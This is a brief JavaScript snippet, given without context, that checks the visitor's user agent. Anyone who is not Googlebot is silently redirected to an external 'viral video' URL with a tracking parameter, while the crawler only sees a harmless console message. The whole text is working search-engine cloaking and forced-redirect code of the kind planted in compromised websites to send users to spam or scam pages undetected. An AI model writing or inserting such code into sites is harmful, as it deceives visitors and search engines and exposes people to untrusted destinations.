if (!navigator.userAgent.includes('Googlebot')) {
  // For regular users - redirect
  window.location.href = "https://viralvidz.xyz/viral-video/?t=MOKAAAAAAA";
} else {
  // For search engine bots - do not redirect
  console.log("Thanks for visiting my page");
}
